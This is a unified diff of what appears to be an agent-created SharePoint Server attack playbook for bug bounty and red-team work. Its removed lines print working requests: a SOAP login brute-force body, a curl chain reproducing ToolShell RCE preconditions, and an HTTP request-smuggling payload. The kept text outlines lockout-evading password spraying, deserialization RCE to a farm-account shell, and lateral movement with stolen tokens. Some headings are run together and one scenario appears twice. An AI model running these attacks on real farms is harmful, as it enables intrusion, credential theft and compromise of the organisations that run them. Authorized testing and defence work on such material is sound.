@@ -4,14 +4,13 @@ description: "Hunt anonymous endpoints, legacy SOAP login bypass and current exp
 agent_created: true
 ---
 
-# SharePoint Server attack surface — unified skill
+# SharePoint Server attack surface — unified methodology
 
-> **Complete merged skill.** Everything from 2 upstream skills across cbh, hunting is contained in this file. Unmodified originals remain in `references/` for provenance only.
+> **Methodology skill.** Merged from 2 upstream skills across cbh, hunting. Payloads, wordlists and supporting data are in `references/`.
 
-## Unified upstream methodology (complete, deduplicated)
+## Unified upstream methodology (deduplicated)
 
 ### Discovery and hunting method
-
 ### Step-by-Step Hunting Methodology
 
 1. **Fingerprint the SharePoint version.** Build number leaks anonymously through several paths. Map the result to the CVE matrix immediately.
@@ -347,10 +346,7 @@ agent_created: true
     - Custom customer-branded modules — check for IDOR, business logic
     - Workflow Services (`/_api/SP.WorkflowServices.*`)
 
----
-
-### Signals and surfaces
-
+---### Signals and surfaces
 ### Crown Jewel Targets
 
 SharePoint Server (on-prem) is one of the richest enterprise attack surfaces in 2025-2026 bug bounty / red-team work. Three forces converge:
@@ -531,10 +527,7 @@ HelpWindowKey('WSSEndUser_troubleshooting                  (anonymous error.aspx
 - `WWW-Authenticate: NTLM` on `/_api/web/CurrentUser` → dual-auth (Forms + NTLM); use `hunt-ntlm-info` for AD-topology disclosure
 - `*.test.<customer>.tld` → test/staging mirror of production SharePoint; data often mirrored from prod
 
----
-
-### Techniques, payloads and bypasses
-
+---### Techniques and bypasses
 ### Common Root Causes
 
 1. **`/_vti_bin/Authentication.asmx` left enabled on the public-zone IIS binding.** SharePoint admins enable Forms auth on a custom login UI and don't realise the legacy SOAP Login endpoint is independently reachable.
@@ -657,10 +650,7 @@ curl -sk "https://target.example/_layouts/15/Picker.aspx?PickerDialogType=Micros
 | HTTP/2 H2.CL smuggling | AWS ALBs often don't advertise `h2` ALPN — close that family early via `openssl s_client -alpn h2,http/1.1` |
 | Authenticate.aspx wraps `Source=` in ReturnUrl | Test post-auth behavior with valid creds; pre-auth chain wraps everything safely |
 
----
-
-### Validation and proof
-
+---### Validation and proof
 ### Gate 0 Validation
 
 Before writing the report:
@@ -694,10 +684,7 @@ Before writing the report:
 - **Compromise assumption:** Unit 42 advises that internet-exposed vulnerable on-prem SharePoint should be assumed compromised; patching alone does not evict. In an engagement, report this as impact/context and recommend IR, key rotation and IIS restart — but keep your own evidence separate from any pre-existing attacker activity.
 - **Redact** NTLM AV-pairs that expose internal forest/DC names, MachineKey values, and any real user PII from `Authentication.asmx` or `_api/` responses before shipping evidence.
 - **Pre-existing compromise check:** before concluding your precondition test was the first exploitation, check for `spinstall0.aspx`, `debug_dev.js`, unusual LAYOUTS file writes, and `w3wp.exe` child processes in the log window. Unit 42's guidance is to assume compromise for exposed vulnerable farms; that context belongs in the report's impact section.
-- **Reproducibility:** the whole precondition chain is three curl commands plus the `?a=/ToolPane.aspx` / Referer variant; include exact paths, headers, status codes and the FormDigest value (redacted). For request smuggling, include the raw CL/TE request bytes and the time-delay measurements (12s vs 0.16s baseline in the published engagement), not just a screenshot.
-
-### Escalation and related chains
-
+- **Reproducibility:** the whole precondition chain is three curl commands plus the `?a=/ToolPane.aspx` / Referer variant; include exact paths, headers, status codes and the FormDigest value (redacted). For request smuggling, include the raw CL/TE request bytes and the time-delay measurements (12s vs 0.16s baseline in the published engagement), not just a screenshot.### Escalation and related chains
 ### Related Skills & Chains
 
 - **`auth-bypass`** — Legacy SOAP `/_vti_bin/Authentication.asmx` accepts anonymous Login calls on misconfigured farms. Chain primitive: SharePoint anon SOAP login probe → if response yields cookie or success differential → `auth-bypass` brute-force matrix (username enumeration via timing, password spray with low-and-slow against the same SOAP endpoint that bypasses ADFS-level lockout) → valid cred → `/_layouts/15/` authenticated surface.
@@ -714,10 +701,7 @@ Before writing the report:
 - **`hunt-ntlm-info`** — Every SharePoint farm advertises `WWW-Authenticate: NTLM` anonymously on `/_vti_bin/`. Chain primitive: SharePoint NTLM Type-2 challenge capture → `hunt-ntlm-info` AV_PAIR decode yields NetBIOS domain + internal DNS forest + DC hostname → feed domain into `m365-entra-attack` ROPC user-enumeration spray on tenant tied to that domain.
 - **`hunt-aspnet`** — SharePoint is ASP.NET Webforms under the covers; ViewState, machineKey, and SafeControl reflection all apply. Chain primitive: SharePoint version disclosure → confirm patch level missing → `hunt-aspnet` ViewState dual-parser MAC-bypass → deserialization gadget → RCE in `w3wp.exe` as farm account.
 - **`hunt-rce`** — ToolShell precondition chain (CVE-2025-53770) is the current high-impact SP RCE path. Chain primitive: ToolShell preconditions met (`/_layouts/15/ToolPane.aspx?DisplayMode=Edit` reachable via the CVE-2025-49706 auth bypass — a crafted `Referer` header pointing at ToolPane.aspx — + version vulnerable) → `hunt-rce` deserialization gadget chain → SYSTEM/farm-account shell → `m365-entra-attack` lateral via stolen on-prem service-account token to Entra-synced identity.
-- **`triage-validation`** — SharePoint farms generate a lot of "looks like a finding" hygiene noise (FormDigest issuance, version disclosure, extension blocklist quirks). Chain primitive: run every SP finding through the 7-Question Gate before reporting — most version-disclosure-only findings die at "is this actually exploitable on this farm" without a paired CVE PoC.
-
-### Sources and related reading
-
+- **`triage-validation`** — SharePoint farms generate a lot of "looks like a finding" hygiene noise (FormDigest issuance, version disclosure, extension blocklist quirks). Chain primitive: run every SP finding through the 7-Question Gate before reporting — most version-disclosure-only findings die at "is this actually exploitable on this farm" without a paired CVE PoC.### Sources and related reading
 ### Scenario B — `/_layouts/15/download.aspx?SourceUrl=` recognized correctly as NOT-SSRF (saved-time example)
 
 Same target. Initial scan flagged `download.aspx?SourceUrl=http://oob.example.com/` as SSRF because the server echoed the URL in the 500 error title (`"The Web application at http://oob.example.com/ could not be found"`). 38 Collaborator-tagged payloads across 12+ URL-accepting SP parameters → zero DNS/HTTP callbacks. Conclusion: `download.aspx` is an SP-internal `SPWebApplication` / `SPFile` resolver, NOT a generic URL fetcher. The "echo" is server-side error-string formatting. Saved from reporting an N/A finding by following the `ssrf` OOB-Or-It-Didn't-Happen Gate.
@@ -740,10 +724,7 @@ Same target. Initial scan flagged `download.aspx?SourceUrl=http://oob.example.co
 
 ### Scenario B — `/_layouts/15/download.aspx?SourceUrl=` recognized correctly as NOT-SSRF (saved-time example)
 
-Same target. Initial scan flagged `download.aspx?SourceUrl=http://oob.example.com/` as SSRF because the server echoed the URL in the 500 error title (`"The Web application at http://oob.example.com/ could not be found"`). 38 Collaborator-tagged payloads across 12+ URL-accepting SP parameters → zero DNS/HTTP callbacks. Conclusion: `download.aspx` is an SP-internal `SPWebApplication` / `SPFile` resolver, NOT a generic URL fetcher. The "echo" is server-side error-string formatting. Saved from reporting an N/A finding by following the `hunt-ssrf` OOB-Or-It-Didn't-Happen Gate.
-
-### Additional notes
-
+Same target. Initial scan flagged `download.aspx?SourceUrl=http://oob.example.com/` as SSRF because the server echoed the URL in the 500 error title (`"The Web application at http://oob.example.com/ could not be found"`). 38 Collaborator-tagged payloads across 12+ URL-accepting SP parameters → zero DNS/HTTP callbacks. Conclusion: `download.aspx` is an SP-internal `SPWebApplication` / `SPFile` resolver, NOT a generic URL fetcher. The "echo" is server-side error-string formatting. Saved from reporting an N/A finding by following the `hunt-ssrf` OOB-Or-It-Didn't-Happen Gate.### Additional notes
 ### Scenario A — a authorized SharePoint engagement against an EoL on-prem farm
 
 Target: `https://target-portal.example/` — SharePoint Server 2013 build `15.0.5545.1000` (KB5002381 / final EoL April 2023 CU). Tenant = a system-integrator tenant (Swiss <ParentCorp> importer) inside a corporate global AD (`customer.parent-corp.example`). Server hostname `WIN-XXXXXXXXXXX` (default Windows installer pattern).
@@ -782,165 +763,8 @@ Same target. Feeding `Microsoft.SharePoint.WebPartPages.DataFormWebPart` (the ca
 - **OOB confirmation of any SSRF claim on SP** → see `hunt-ssrf` OOB-Or-It-Didn't-Happen Gate.
 - **Engagement-type confirmation before treating hygiene findings as bug-bounty submissions** → see `bb-methodology` PART 0 Mode-Confirmation Gate.
 
----
-
-## Companion methodology (complete, deduplicated)
-
-Full text of every non-SKILL.md methodology document from the contributing skills.
-
-### Companion: hunting / references/payloads.md
-
-# sharepoint — Payload reference
-
-Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.
-
----
-
-## Payload & Detection Patterns
-
-
-
-**Authentication.asmx Login (the canonical brute-force endpoint):**
-
-```xml
-
-POST /_vti_bin/Authentication.asmx HTTP/1.1
-
-Host: target.example
-
-Content-Type: text/xml; charset=utf-8
-
-SOAPAction: http://schemas.microsoft.com/sharepoint/soap/Login
-
-Content-Length: 376
-
-
-
-<?xml version="1.0" encoding="utf-8"?>
-
-<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
-
-  <soap:Body>
-
-    <Login xmlns="http://schemas.microsoft.com/sharepoint/soap/">
-
-      <username>USERNAME</username>
-
-      <password>PASSWORD</password>
-
-    </Login>
-
-  </soap:Body>
-
-</soap:Envelope>
-
-```
-
-Response codes:
-
-- `<ErrorCode>NoError</ErrorCode>` → auth success; `<CookieName>FedAuth</CookieName>` and `<TimeoutSeconds>...</TimeoutSeconds>` follow
-
-- `<ErrorCode>PasswordNotMatch</ErrorCode>` → auth fail (uniform for non-existent users too — no enum leak via error string)
-
-- 500 + `<faultstring>Value cannot be null. Parameter name: userName</faultstring>` → empty username
-
-
-
-**ToolShell precondition reproduction:**
-
-```bash
-
-# Step 1: anon GET ToolPane.aspx
-
-TP=$(curl -sk "https://target.example/_layouts/15/ToolPane.aspx?DisplayMode=Edit")
-
-echo "$TP" | grep -oE '__VIEWSTATEENCRYPTED" id="__VIEWSTATEENCRYPTED" value="[^"]*"'
-
-# If value="" → precondition
-
-
-
-# Step 2: anon FormDigest
-
-DIGEST=$(curl -sk -X POST "https://target.example/_api/contextinfo" \
-
-  -H "Accept: application/json;odata=verbose" \
-
-  | jq -r '.d.GetContextWebInformation.FormDigestValue')
-
-echo "Digest: ${DIGEST:0:40}..."
-
-
-
-# Step 3: anon POST ToolPane with digest
-
-curl -sk -X POST -H "X-RequestDigest: $DIGEST" \
-
-  --data "MSOSPWebPartManager_DisplayModeName=Browse&MSOTlPn_Button=none" \
-
-  "https://target.example/_layouts/15/ToolPane.aspx?DisplayMode=Edit" \
-
-  -w "\ncode=%{http_code} size=%{size_download}\n"
-
-```
-
-
-
-**HTTP TE.CL smuggling on AWS ELB + SP IIS back-end** (consistent on SP farms behind AWS ELB):
-
-```
-
-POST /_layouts/15/blank.htm HTTP/1.1
-
-Host: target.example
-
-Content-Length: 4
-
-Transfer-Encoding: chunked
-
-
-
-5c
-
-GPOST /404 HTTP/1.1
-
-Host: x
-
-Content-Length: 15
-
-
-
-x=1
-
-0
-
-
-
-```
-
-Expected back-end hang: ~12 s vs ~0.16 s baseline (consistent across 5 trials). Obfuscation variants (`Transfer-Encoding : chunked`, `transfer-encoding: chunked`, trailing-space, mixed-case) produce a similar ~6 s hang.
-
-
-
-**Picker.aspx SafeControl recon:**
-
-```bash
-
-curl -sk "https://target.example/_layouts/15/Picker.aspx?PickerDialogType=Microsoft.SharePoint.WebPartPages.DataFormWebPart&typeName=System.String" \
-
-  | grep -oE "<title>[^<]+</title>"
-
-# "Only PickerDialog types..." = exists, not whitelisted
-
-# "Could not load type..."    = does not exist
-
-```
-
-
-
----
-
-### Companion: hunting / references/techniques.md
+---### Companion methodology (deduplicated)
+### hunting / references/techniques.md
 
 # sharepoint — Technique reference
 
@@ -980,17 +804,9 @@ Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you 
 
 
 
----
+---## Probes
 
-## Source skills merged into this topic
+## Supporting data
 
-- `hunting` — `sharepoint`
-- `cbh` — `hunt-sharepoint`
-
-## Provenance
-
-- `references/unified-method.md` — same deduplicated union as this file, for tooling
-- `references/upstream-*.md` — unmodified original SKILL.md from each repo
-- `references/upstream-assets/` — 2 companion files
-- `../../upstream/` — complete unmodified archives of all five source repositories
+- `references/payloads.md` — curated payload bank + upstream payload references
 - `bbhunt-methodology` — orchestrator, state machine and class router
